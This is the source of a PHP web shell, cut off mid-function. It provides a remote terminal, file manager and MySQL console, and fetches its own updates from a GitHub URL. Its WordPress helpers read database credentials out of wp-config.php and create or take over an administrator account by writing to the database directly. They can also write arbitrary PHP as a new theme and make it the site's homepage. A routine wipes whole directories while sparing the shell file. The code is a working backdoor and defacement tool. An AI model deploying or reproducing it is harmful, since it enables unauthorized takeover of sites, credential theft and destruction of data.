<?php
/**
 * Advanced PHP Web Shell - Terminal & File Manager + MySQL
 * Version: 1.2.1
 * WARNING: Extremely dangerous. Use only in controlled, authorized environments.
 *
 * Changelog:
 *   1.2.1 - Fix JS syntax error on rename/chmod/copy/dirsize by using data-* attributes
 *   1.2.0 - Fix rename/chmod/search reload bug (missing type="button" in bulkForm)
 *           Fix JS string escaping using json_encode()
 *   1.1.0 - Handles disabled exec/shell_exec gracefully
 *           Added upload ZIP and extract to current directory
 *   1.0.0 - Initial release
 */

// --- Auto-Update Config ---
define('SHELL_VERSION', '1.2.1');
define('SHELL_UPDATE_URL', 'https://raw.githubusercontent.com/anjay801/weewe/refs/heads/main/anoboy.php');
define('SHELL_VERSION_URL', 'https://raw.githubusercontent.com/anjay801/weewe/refs/heads/main/version.txt');

session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

// --- Configuration ---
$title = "PHP Shell • Terminal & File Manager";
$max_upload = 50 * 1024 * 1024; // 50MB
$hist_limit = 50;

// --- Session Init ---
if (!isset($_SESSION['history']))
    $_SESSION['history'] = [];
if (!isset($_SESSION['cwd']))
    $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['db']))
    $_SESSION['db'] = null;

if (!is_dir($_SESSION['cwd']))
    $_SESSION['cwd'] = getcwd();

// --- Helper Functions ---
function safeCwd()
{
    return $_SESSION['cwd'];
}

function formatSize($bytes)
{
    if ($bytes < 0)
        $bytes = 0;
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function dirSize($dir)
{
    $size = 0;
    if (!is_dir($dir))
        return $size;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }
    } catch (Exception $e) {
    }
    return $size;
}

function listDirectory($dir)
{
    $items = [];
    if (!is_dir($dir))
        return $items;
    $handle = @opendir($dir);
    if (!$handle)
        return $items;
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.' || $entry === '..')
            continue;
        $full = $dir . DIRECTORY_SEPARATOR . $entry;
        $isDir = is_dir($full);
        $items[] = [
            'name' => $entry,
            'path' => $full,
            'isDir' => $isDir,
            'size' => $isDir ? '--' : formatSize(@filesize($full) ?: 0),
            'rawSize' => $isDir ? 0 : (@filesize($full) ?: 0),
            'perms' => substr(sprintf('%o', @fileperms($full) ?: 0), -4),
            'modified' => date('Y-m-d H:i', @filemtime($full) ?: 0),
        ];
    }
    closedir($handle);
    usort($items, function ($a, $b) {
        if ($a['isDir'] && !$b['isDir'])
            return -1;
        if (!$a['isDir'] && $b['isDir'])
            return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function deleteDirectoryRecursive($dir)
{
    if (!is_dir($dir))
        return false;
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectoryRecursive($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

/**
 * Clear directory: delete all contents (files + subdirs) but keep the dir itself.
 * $selfProtect = realpath of the file that must NOT be deleted (the shell itself).
 * Returns ['deleted'=>int, 'skipped'=>int, 'errors'=>int]
 */
function clearDirectory($dir, $selfProtect = null)
{
    $stats = ['deleted' => 0, 'skipped' => 0, 'errors' => 0];
    if (!is_dir($dir))
        return $stats;
    $selfProtect = $selfProtect ? realpath($selfProtect) : null;
    $items = @scandir($dir);
    if (!$items)
        return $stats;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        // Protect the shell file itself
        if ($selfProtect && realpath($path) === $selfProtect) {
            $stats['skipped']++;
            continue;
        }
        if (is_dir($path)) {
            // If the shell file is somewhere inside this subdir, we need to skip that file
            // but still try to clear/delete the rest of the subdir
            if ($selfProtect && strpos($selfProtect, realpath($path) . DIRECTORY_SEPARATOR) === 0) {
                // Shell is inside this subdir — recursively clear but protect shell
                clearDirectoryRecursiveProtected($path, $selfProtect, $stats);
                // Don't rmdir because shell is inside
                $stats['skipped']++;
            } else {
                // Safe to delete fully
                if (_deleteRecursivePlain($path)) {
                    $stats['deleted']++;
                } else {
                    $stats['errors']++;
                }
            }
        } else {
            if (@unlink($path)) {
                $stats['deleted']++;
            } else {
                $stats['errors']++;
            }
        }
    }
    return $stats;
}

function _deleteRecursivePlain($dir)
{
    if (!is_dir($dir))
        return @unlink($dir);
    $items = @scandir($dir);
    if (!$items)
        return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path))
            _deleteRecursivePlain($path);
        else
            @unlink($path);
    }
    return @rmdir($dir);
}

function clearDirectoryRecursiveProtected($dir, $selfProtect, &$stats)
{
    if (!is_dir($dir))
        return;
    $items = @scandir($dir);
    if (!$items)
        return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if ($selfProtect && realpath($path) === $selfProtect) {
            $stats['skipped']++;
            continue;
        }
        if (is_dir($path)) {
            if ($selfProtect && strpos($selfProtect, realpath($path) . DIRECTORY_SEPARATOR) === 0) {
                clearDirectoryRecursiveProtected($path, $selfProtect, $stats);
            } else {
                if (_deleteRecursivePlain($path))
                    $stats['deleted']++;
                else
                    $stats['errors']++;
            }
        } else {
            if (@unlink($path))
                $stats['deleted']++;
            else
                $stats['errors']++;
        }
    }
}

function zipDirectory($sourcePath, $outZipPath)
{
    if (!class_exists('ZipArchive'))
        return false;
    $zip = new ZipArchive();
    if ($zip->open($outZipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true)
        return false;
    $sourcePath = realpath($sourcePath);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sourcePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($sourcePath) + 1);
        if ($file->isDir()) {
            $zip->addEmptyDir($relativePath);
        } else {
            $zip->addFile($filePath, $relativePath);
        }
    }
    $zip->close();
    return true;
}

/**
 * Extract ZIP file to target directory with path traversal protection.
 * Returns array: ['success'=>bool, 'extracted'=>int, 'errors'=>int, 'skipped'=>int, 'message'=>string]
 */
function extractZip($zipFile, $targetDir)
{
    $result = ['success' => false, 'extracted' => 0, 'errors' => 0, 'skipped' => 0, 'message' => ''];
    if (!class_exists('ZipArchive')) {
        $result['message'] = 'ZipArchive class not available.';
        return $result;
    }
    if (!is_file($zipFile)) {
        $result['message'] = 'ZIP file not found.';
        return $result;
    }
    if (!is_dir($targetDir)) {
        $result['message'] = 'Target directory does not exist.';
        return $result;
    }

    $zip = new ZipArchive();
    if ($zip->open($zipFile) !== true) {
        $result['message'] = 'Cannot open ZIP file.';
        return $result;
    }

    $targetDir = realpath($targetDir);
    $targetDirWithSep = $targetDir . DIRECTORY_SEPARATOR;

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $entryName = $zip->getNameIndex($i);
        if ($entryName === false)
            continue;

        // Prevent directory traversal attacks
        $destPath = $targetDir . DIRECTORY_SEPARATOR . $entryName;
        $realDestPath = realpath(dirname($destPath)) . DIRECTORY_SEPARATOR . basename($destPath);
        // Normalize path separators and check if within target
        $normalizedTarget = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR;
        $normalizedDest = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $destPath);
        if (strpos($normalizedDest, $normalizedTarget) !== 0) {
            $result['skipped']++;
            continue; // Skip files that would extract outside target
        }

        // Create directory if entry ends with slash (folder)
        if (substr($entryName, -1) === '/' || substr($entryName, -1) === '\\') {
            if (!is_dir($destPath)) {
                @mkdir($destPath, 0755, true);
            }
            continue;
        }

        // Ensure parent directory exists
        $parentDir = dirname($destPath);
        if (!is_dir($parentDir)) {
            @mkdir($parentDir, 0755, true);
        }

        // Extract file
        if ($zip->extractTo($targetDir, $entryName)) {
            $result['extracted']++;
        } else {
            $result['errors']++;
        }
    }

    $zip->close();
    $result['success'] = ($result['errors'] === 0);
    $result['message'] = "Extracted: {$result['extracted']} files, {$result['errors']} errors, {$result['skipped']} skipped (path traversal).";
    return $result;
}

function searchFiles($dir, $keyword, $maxResults = 200)
{
    $results = [];
    if (!is_dir($dir))
        return $results;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if (stripos($file->getFilename(), $keyword) !== false) {
                $results[] = [
                    'path' => $file->getRealPath(),
                    'name' => $file->getFilename(),
                    'isDir' => $file->isDir(),
                    'size' => $file->isDir() ? '--' : formatSize($file->getSize()),
                ];
                if (count($results) >= $maxResults)
                    break;
            }
        }
    } catch (Exception $e) {
    }
    return $results;
}

// ============================================================
// === WP AUTO-ADMIN HELPERS ==================================
// ============================================================

/**
 * Walk UP directory tree looking for $filename, up to $maxLevels.
 * Returns absolute path if found, or false.
 */
function findFileUpward($startDir, $filename, $maxLevels = 25)
{
    $dir = realpath($startDir);
    if (!$dir) return false;
    for ($i = 0; $i < $maxLevels; $i++) {
        $candidate = $dir . DIRECTORY_SEPARATOR . $filename;
        if (file_exists($candidate)) {
            return $candidate;
        }
        $parent = dirname($dir);
        if ($parent === $dir) break; // reached filesystem root
        $dir = $parent;
    }
    return false;
}

/**
 * Parse wp-config.php for DB credentials and table prefix.
 * Uses regex — does NOT include/execute the file.
 * Returns array or false on failure.
 */
function parseWpConfig($configPath)
{
    $content = @file_get_contents($configPath);
    if ($content === false) return false;

    $extract = function($name) use ($content) {
        // Match: define('DB_NAME', 'value'); or define( "DB_NAME", "value" );
        if (preg_match("/define\s*\(\s*['\"]" . preg_quote($name, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"].*?\)/s", $content, $m)) {
            return $m[1];
        }
        return null;
    };

    // Table prefix: $table_prefix = 'wp_';
    $prefix = 'wp_';
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([a-zA-Z0-9_]+)[\'"]\s*;/', $content, $m)) {
        $prefix = $m[1];
    }

    return [
        'db_host'   => $extract('DB_HOST')     ?? 'localhost',
        'db_user'   => $extract('DB_USER')     ?? '',
        'db_pass'   => $extract('DB_PASSWORD') ?? '',
        'db_name'   => $extract('DB_NAME')     ?? '',
        'db_charset'=> $extract('DB_CHARSET')  ?? 'utf8',
        'prefix'    => $prefix,
    ];
}

/**
 * Portable PHP password hasher (phpass subset — same algorithm WordPress uses).
 * This is a self-contained implementation so we don't need wp-load.php.
 *
 * Produces $P$ hashes compatible with WordPress.
 */
function wpHashPasswordPortable($password)
{
    // itoa64 alphabet
    $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

    $encode64 = function($input, $count) use ($itoa64) {
        $output = '';
        $i = 0;
        do {
            $value = ord($input[$i++]);
            $output .= $itoa64[$value & 0x3f];
            if ($i < $count) $value |= ord($input[$i]) << 8;
            $output .= $itoa64[($value >> 6) & 0x3f];
            if ($i++ >= $count) break;
            if ($i < $count) $value |= ord($input[$i]) << 16;
            $output .= $itoa64[($value >> 12) & 0x3f];
            if ($i++ >= $count) break;
            $output .= $itoa64[($value >> 18) & 0x3f];
        } while ($i < $count);
        return $output;
    };

    // WordPress uses log2 cost = 8 → iteration_count = 256
    $count_log2 = 8;
    $count      = 1 << $count_log2;

    // Generate 6-byte random salt → 8 char itoa64
    $random = '';
    for ($i = 0; $i < 6; $i++) $random .= chr(mt_rand(0, 255));
    $salt = '$P$' . $itoa64[min($count_log2 + 5, 30)] . $encode64($random, 6);

    // Hash
    $hash = md5($salt . $password, true);
    for ($i = 0; $i < $count; $i++) {
        $hash = md5($hash . $password, true);
    }
    return $salt . $encode64($hash, 16);
}

/**
 * Hash a password using WP's method.
 * Tries to load wp-includes/class-phpass.php first (from detected WP root),
 * falls back to our portable implementation.
 *
 * $wpRoot: directory containing wp-includes/
 * Returns hashed string.
 */
function wpHashPassword($password, $wpRoot = null)
{
    // Try loading WP's own PasswordHash class
    if ($wpRoot) {
        $phpassFile = rtrim($wpRoot, '/\\') . '/wp-includes/class-phpass.php';
        if (file_exists($phpassFile)) {
            // Include in a tight scope to avoid polluting globals
            $loaded = (function() use ($phpassFile) {
                if (!class_exists('PasswordHash')) {
                    @include_once $phpassFile;
                }
                return class_exists('PasswordHash');
            })();
            if ($loaded) {
                $hasher = new PasswordHash(8, true);
                return $hasher->HashPassword($password);
            }
        }
    }
    // Fallback: our portable phpass
    return wpHashPasswordPortable($password);
}

// ============================================================
// === WP AUTO-ADMIN ACTION ===================================
// ============================================================

/**
 * Full auto-admin flow. Returns array of step log entries:
 * [['ok'=>bool, 'msg'=>string], ...]
 */
function wpAutoAdmin($startDir, $adminLogin, $adminEmail, $adminPass, $adminDisplay = null)
{
    $log     = [];
    $ok      = function($msg) use (&$log) { $log[] = ['ok' => true,  'msg' => $msg]; };
    $fail    = function($msg) use (&$log) { $log[] = ['ok' => false, 'msg' => $msg]; };

    if (!$adminDisplay) $adminDisplay = $adminLogin;

    // ── STEP 1: Find wp-load.php (to determine WP root) ─────────────────────
    $wpLoad = findFileUpward($startDir, 'wp-load.php', 25);
    if ($wpLoad) {
        $wpRoot = dirname($wpLoad);
        $ok("Found wp-load.php → WP root: $wpRoot");
    } else {
        $wpRoot = null;
        $fail("wp-load.php not found in 25 levels up from $startDir — will still try wp-config.php");
    }

    // ── STEP 2: Find wp-config.php ───────────────────────────────────────────
    // WP sometimes puts wp-config.php one level above WP root
    $wpConfigStart = $wpRoot ?? $startDir;
    $wpConfig = findFileUpward($wpConfigStart, 'wp-config.php', 5);
    if (!$wpConfig) {
        // Try one level above wp root too
        $wpConfig = findFileUpward(dirname($wpConfigStart), 'wp-config.php', 5);
    }
    if (!$wpConfig) {
        $fail("wp-config.php not found. Cannot auto-connect to DB.");
        return $log;
    }
    $ok("Found wp-config.php: $wpConfig");

    // ── STEP 3: Parse credentials ────────────────────────────────────────────
    $cfg = parseWpConfig($wpConfig);
    if (!$cfg || empty($cfg['db_user'])) {
        $fail("Failed to parse DB credentials from wp-config.php.");
        return $log;
    }
    $ok("Parsed config → host={$cfg['db_host']} user={$cfg['db_user']} db={$cfg['db_name']} prefix={$cfg['prefix']}");

    // ── STEP 4: Hash password ────────────────────────────────────────────────
    $hashedPw = wpHashPassword($adminPass, $wpRoot);
    $hashSource = (class_exists('PasswordHash') || ($wpRoot && file_exists($wpRoot . '/wp-includes/class-phpass.php')))
        ? 'WP phpass (class-phpass.php)'
        : 'portable phpass fallback';
    $ok("Password hashed via $hashSource");

    // ── STEP 5: Connect MySQL ────────────────────────────────────────────────
    if (!function_exists('mysqli_connect')) {
        $fail("mysqli extension not available.");
        return $log;
    }
    $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
    if (!$conn) {
        $fail("MySQL connect failed: " . mysqli_connect_error());
        return $log;
    }
    mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
    $ok("Connected to MySQL: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}");

    // Also persist to session so the MySQL panel shows connected
    $_SESSION['mysql'] = [
        'host'      => $cfg['db_host'],
        'user'      => $cfg['db_user'],
        'pass'      => $cfg['db_pass'],
        'db'        => $cfg['db_name'],
        'connected' => true,
    ];

    $prefix    = $cfg['prefix'];
    $usersT    = $prefix . 'users';
    $usermetaT = $prefix . 'usermeta';
    $capKey    = $prefix . 'capabilities';
    $levelKey  = $prefix . 'user_level';

    $esc = function($v) use ($conn) { return mysqli_real_escape_string($conn, $v); };

    // ── STEP 6: Check existing user ─────────────────────────────────────────
    $r = mysqli_query($conn, "SELECT ID FROM `$usersT` WHERE user_login='" . $esc($adminLogin) . "' LIMIT 1");
    $existingId = null;
    if ($r && mysqli_num_rows($r) > 0) {
        $existingId = (int) mysqli_fetch_row($r)[0];
        mysqli_free_result($r);
        $ok("User '$adminLogin' already exists (ID: $existingId) — will update");
    } else {
        if ($r) mysqli_free_result($r);
        $ok("User '$adminLogin' does not exist — will create new");
    }

    if ($existingId) {
        // ── STEP 7a: Update existing user ───────────────────────────────────
        $q = mysqli_query($conn, "UPDATE `$usersT` SET user_pass='" . $esc($hashedPw) . "', user_email='" . $esc($adminEmail) . "', display_name='" . $esc($adminDisplay) . "' WHERE ID=$existingId");
        if (!$q) { $fail("UPDATE user failed: " . mysqli_error($conn)); mysqli_close($conn); return $log; }
        $ok("Updated user row (password + email reset)");

        // Upsert usermeta
        mysqli_query($conn, "DELETE FROM `$usermetaT` WHERE user_id=$existingId AND meta_key IN ('" . $esc($capKey) . "','" . $esc($levelKey) . "')");
        $q2 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($existingId,'" . $esc($capKey) . "','a:1:{s:13:\"administrator\";b:1;}')");
        $q3 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($existingId,'" . $esc($levelKey) . "','10')");
        if (!$q2 || !$q3) { $fail("Usermeta upsert failed: " . mysqli_error($conn)); }
        else { $ok("Usermeta set → administrator (level 10)"); }

    } else {
        // ── STEP 7b: Insert new user ─────────────────────────────────────────
        $q = mysqli_query($conn,
            "INSERT INTO `$usersT` (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES ("
            . "'" . $esc($adminLogin)   . "',"
            . "'" . $esc($hashedPw)     . "',"
            . "'" . $esc($adminLogin)   . "',"
            . "'" . $esc($adminEmail)   . "',"
            . "NOW(),0,"
            . "'" . $esc($adminDisplay) . "')"
        );
        if (!$q) { $fail("INSERT user failed: " . mysqli_error($conn)); mysqli_close($conn); return $log; }
        $newId = (int) mysqli_insert_id($conn);
        $ok("Inserted new user (ID: $newId)");

        $q2 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($newId,'" . $esc($capKey) . "','a:1:{s:13:\"administrator\";b:1;}')");
        $q3 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($newId,'" . $esc($levelKey) . "','10')");
        if (!$q2 || !$q3) { $fail("Usermeta insert failed: " . mysqli_error($conn)); }
        else { $ok("Usermeta inserted → administrator (level 10)"); }
    }

    mysqli_close($conn);

    // ── STEP 8: Summary ──────────────────────────────────────────────────────
    $ok("✅ Done! Login: $adminLogin | Pass: $adminPass | Email: $adminEmail");

    return $log;
}

// ============================================================
// === WP THEME CREATOR =======================================
// ============================================================

/**
 * Create a minimal WordPress theme from HTML input, activate it,
 * and optionally set it as the homepage.
 *
 * @param  string $startDir    Starting directory (current shell dir)
 * @param  string $themeSlug   Theme directory name (e.g. "caga-theme")
 * @param  string $themeName   Human-readable theme name
 * @param  string $htmlContent Full HTML the user typed — becomes the theme template
 * @param  bool   $setHomepage Whether to create a page and set it as front page
 * @return array  Log entries: [['ok'=>bool,'msg'=>string], ...]
 */
function wpCreateTheme($startDir, $themeSlug, $themeName, $htmlContent, $setHomepage = true)
{
    $log = [];
    $ok   = function($msg) use (&$log) { $log[] = ['ok' => true,  'msg' => $msg]; };
    $fail = function($msg) use (&$log) { $log[] = ['ok' => false, 'msg' => $msg]; };

    // ── STEP 1: Validate HTML/PHP syntax ─────────────────────────────────────
    // Wrap in PHP tags so php -l can check it if there's any embedded PHP
    $tmpFile = sys_get_temp_dir() . '/wp_theme_check_' . getmypid() . '.php';
    $wrappedForCheck = "<?php /* syntax check wrapper */ ?>\n" . $htmlContent;
    file_put_contents($tmpFile, $wrappedForCheck);
    $syntaxOk = true;
    $syntaxMsg = '';
    if (function_exists('shell_exec')) {
        $lintOut = shell_exec('php -l ' . escapeshellarg($tmpFile) . ' 2>&1');
        if ($lintOut !== null && strpos($lintOut, 'No syntax errors') === false) {
            $syntaxOk = false;
            $syntaxMsg = trim($lintOut);
        }
    } elseif (function_exists('exec')) {
        exec('php -l ' . escapeshellarg($tmpFile) . ' 2>&1', $lintLines);
        $lintOut = implode("\n", $lintLines);
        if (strpos($lintOut, 'No syntax errors') === false && !empty(trim($lintOut))) {
            $syntaxOk = false;
            $syntaxMsg = $lintOut;
        }
    }
    @unlink($tmpFile);

    if (!$syntaxOk) {
        $fail("Syntax error in theme content: " . $syntaxMsg);
        return $log;
    }
    $ok("Syntax check passed.");

    // ── STEP 2: Find WordPress root ───────────────────────────────────────────
    $wpConfig = findFileUpward($startDir, 'wp-config.php', 25);
    if (!$wpConfig) {
        $fail("wp-config.php not found within 25 levels.");
        return $log;
    }
    $wpRoot = dirname($wpConfig);
    $ok("WordPress root found: $wpRoot");

    // ── STEP 3: Parse DB credentials ──────────────────────────────────────────
    $cfg = parseWpConfig($wpConfig);
    if (!$cfg || empty($cfg['db_name'])) {
        $fail("Could not parse DB credentials from wp-config.php");
        return $log;
    }
    $ok("Parsed DB credentials (host={$cfg['db_host']}, db={$cfg['db_name']})");

    // ── STEP 4: Locate wp-content/themes ─────────────────────────────────────
    $themesDir = $wpRoot . '/wp-content/themes';
    if (!is_dir($themesDir)) {
        $fail("wp-content/themes not found at: $themesDir");
        return $log;
    }
    $themeDir = $themesDir . '/' . $themeSlug;

    // ── STEP 5: Write theme files ─────────────────────────────────────────────
    if (!is_dir($themeDir)) {
        if (!@mkdir($themeDir, 0755, true)) {
            $fail("Cannot create theme directory: $themeDir");
            return $log;
        }
    }
    $ok("Theme directory ready: $themeDir");

    // style.css — WordPress requires this header
    $styleCss = "/*\nTheme Name: {$themeName}\nTheme URI: https://github.com/anjay801/weewe\nAuthor: Caga Team\nDescription: Custom theme generated by Advanced PHP Shell.\nVersion: 1.0.0\n*/\n\n/* Generated theme — styles injected from HTML if any */\nbody { margin: 0; padding: 0; }\n";
    if (file_put_contents($themeDir . '/style.css', $styleCss) === false) {
        $fail("Cannot write style.css");
        return $log;
    }
    $ok("Written: style.css");

    // index.php — the main template — contains the user's HTML
    // If HTML doesn't start with <!DOCTYPE, add a minimal wrapper
    $tplContent = $htmlContent;
    if (stripos(trim($tplContent), '<?php') === false && stripos(trim($tplContent), '<!doctype') === false) {
        // Plain HTML — wrap with doctype
        $tplContent = "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title><?php bloginfo('name'); ?></title>\n<?php wp_head(); ?>\n</head>\n<body>\n" . $tplContent . "\n<?php wp_footer(); ?>\n</body>\n</html>\n";
    } elseif (stripos(trim($tplContent), '<!doctype') !== false && stripos($tplContent, '<?php wp_head') === false) {
        // Has doctype but no WP hooks — inject wp_head/wp_footer if possible
        $tplContent = preg_replace('/(<\/head\s*>)/i', "<?php wp_head(); ?>\n$1", $tplContent, 1);
        $tplContent = preg_replace('/(<\/body\s*>)/i', "<?php wp_footer(); ?>\n$1", $tplContent, 1);
    }
    if (file_put_contents($themeDir . '/index.php', $tplContent) === false) {
        $fail("Cannot write index.php");
        return $log;
    }
    $ok("Written: index.php (theme template)");

    // functions.php — minimal, adds theme support
    $funcPhp = "<?php\n// Auto-generated by Advanced PHP Shell\nadd_theme_support('title-tag');\nadd_theme_support('post-thumbnails');\n";
    file_put_contents($themeDir . '/functions.php', $funcPhp);
    $ok("Written: functions.php");

    // ── STEP 6: Connect MySQL ─────────────────────────────────────────────────
    if (!function_exists('mysqli_connect')) {
        $fail("mysqli extension not available.");
        return $log;
    }
    $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
    if (!$conn) {
        $fail("MySQL connect failed: " . mysqli_connect_error());
        return $log;
    }
    mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
    $ok("Connected to MySQL.");

    // Detect actual table prefix
    $prefix = $cfg['prefix'];
    $r = mysqli_query($conn, "SHOW TABLES LIKE '{$prefix}options'");
    if (!$r || mysqli_num_rows($r) === 0) {
        // Try to detect prefix from SHOW TABLES
        $r2 = mysqli_query($conn, "SHOW TABLES");
        $tables = [];
        while ($row = mysqli_fetch_row($r2)) $tables[] = $row[0];
        mysqli_free_result($r2);
        foreach ($tables as $t) {
            if (substr($t, -7) === 'options') {
                $prefix = substr($t, 0, strlen($t) - 7);
                break;
            }
        }
    } else { mysqli_free_result($r); }
    $optionsT = $prefix . 'options';
    $ok("Using table prefix: '$prefix'");

    $esc = function($v) use ($conn) { return mysqli_real_escape_string($conn, $v); };

    // ── STEP 7: Activate the theme ────────────────────────────────────────────
    $updateOpt = function($key, $value) use ($conn, $optionsT, $esc) {
        $r = mysqli_query($conn, "SELECT option_id FROM `{$optionsT}` WHERE option_name='" . $esc($key) . "' LIMIT 1");
        if ($r && mysqli_num_rows($r) > 0) {
            mysqli_free_result($r);
            mysqli_query($conn, "UPDATE `{$optionsT}` SET option_value='" . $esc($value) . "' WHERE option_name='" . $esc($key) . "'");
        } else {
            if ($r) mysqli_free_result($r);
            mysqli_query($conn, "INSERT INTO `{$optionsT}` (option_name, option_value, autoload) VALUES ('" . $esc($key) . "','" . $esc($value) . "','yes')");
        }
        return mysqli_affected_rows($conn) >= 0;
    };

    $updateOpt('template',   $themeSlug);
    $updateOpt('stylesheet', $themeSlug);
    $ok("Theme activated: template=$themeSlug, stylesheet=$themeSlug");

    // Clear WP's current_theme cache
    $updateOpt('current_theme', $themeName);

    // ── STEP 8: Set homepage (optional) ──────────────────────────────────────
    if ($setHomepage) {
        // Check if a page for this theme already exists
        $postsT = $prefix . 'posts';
        $pageTitle = $themeName . ' Home';
        $r = mysqli_query($conn, "SELECT ID FROM `{$postsT}` WHERE post_title='" . $esc($pageTitle) . "' AND post_type='page' AND post_status='publish' LIMIT 1");
        $pageId = null;
        if ($r && mysqli_num_rows($r) > 0) {
            $pageId = (int) mysqli_fetch_row($r)[0];
            mysqli_free_result($r);
            $ok("Found existing homepage page (ID: $pageId)");
        } else {
            if ($r) mysqli_free_result($r);
            // Create a new published page
            // All NOT NULL columns in wp_posts must be explicitly provided
            $now = date('Y-m-d H:i:s');
            $slug = $themeSlug . '-home';
            $q = mysqli_query($conn,
                "INSERT INTO `{$postsT}`"
                . " (post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt,"
                . "  post_status, comment_status, ping_status, post_password, post_name,"
                . "  to_ping, pinged, post_content_filtered,"
                . "  post_parent, guid, menu_order, post_type, post_mime_type, comment_count,"
                . "  post_modified, post_modified_gmt)"
                . " VALUES"
                . " (1, '$now', '$now', '', '" . $esc($pageTitle) . "', '',"
                . "  'publish', 'closed', 'closed', '', '" . $esc($slug) . "',"
                . "  '', '', '',"
                . "  0, '', 0, 'page', '', 0,"
                . "  '$now', '$now')"
            );
            if (!$q) {
                $fail("Failed to create homepage page: " . mysqli_error($conn));
            } else {
                $pageId = (int) mysqli_insert_id($conn);
                $ok("Created homepage page (ID: $pageId, title: $pageTitle)");
            }
        }

        if ($pageId) {
            $updateOpt('show_on_front', 'page');
            $updateOpt('page_on_front', (string) $pageId);
            $ok("Homepage set: show_on_front=page, page_on_front=$pageId");
        }
    }

    mysqli_close($conn);

    $ok("✅ Done! Theme '$themeName' created, activated" . ($setHomepage ? ", homepage set" : "") . ".");
    return $log;
}

// ============================================================
// === WP PURGE CACHE =========================================
// ============================================================

/**
 * Purge WordPress transients & flush rewrite rules via SQL only.
 * No exec/shell_exec required.
 * Returns array of log entries: [['ok'=>bool, 'msg'=>string], ...]
 */
function wpPurgeCache($startDir)
{
    $log  = [];
    $ok   = function($msg) use (&$log) { $log[] = ['ok' => true,  'msg' => $msg]; };
    $fail = function($msg) use (&$log) { $log[] = ['ok' => false, 'msg' => $msg]; };

    // ── STEP 1: Find wp-config.php ───────────────────────────────────────
    $wpConfig = findFileUpward($startDir, 'wp-config.php', 25);
    if (!$wpConfig) {
        $fail("wp-config.php not found within 25 levels from: $startDir");
        return $log;
    }
    $ok("Found wp-config.php: $wpConfig");

    // ── STEP 2: Parse DB credentials ────────────────────────────────────
    $cfg = parseWpConfig($wpConfig);
    if (!$cfg || empty($cfg['db_name'])) {
        $fail("Failed to parse DB credentials from wp-config.php.");
        return $log;
    }
    $ok("Parsed config → host={$cfg['db_host']} user={$cfg['db_user']} db={$cfg['db_name']} prefix={$cfg['prefix']}");

    // ── STEP 3: Connect MySQL ────────────────────────────────────────────
    if (!function_exists('mysqli_connect')) {
        $fail("mysqli extension not available.");
        return $log;
    }
    $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
    if (!$conn) {
        $fail("MySQL connect failed: " . mysqli_connect_error());
        return $log;
    }
    mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
    $ok("Connected to MySQL: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}");

    $prefix   = $cfg['prefix'];
    $optionsT = $prefix . 'options';

    // ── STEP 4: Delete transients ────────────────────────────────────────
    $q1 = mysqli_query($conn, "DELETE FROM `{$optionsT}` WHERE option_name LIKE '\_transient\_%'");
    if ($q1 === false) {
        $fail("DELETE transients failed: " . mysqli_error($conn));
    } else {
        $n1 = mysqli_affected_rows($conn);
        $ok("Deleted $n1 transient(s) (_transient_*)");
    }

    $q2 = mysqli_query($conn, "DELETE FROM `{$optionsT}` WHERE option_name LIKE '\_site\_transient\_%'");
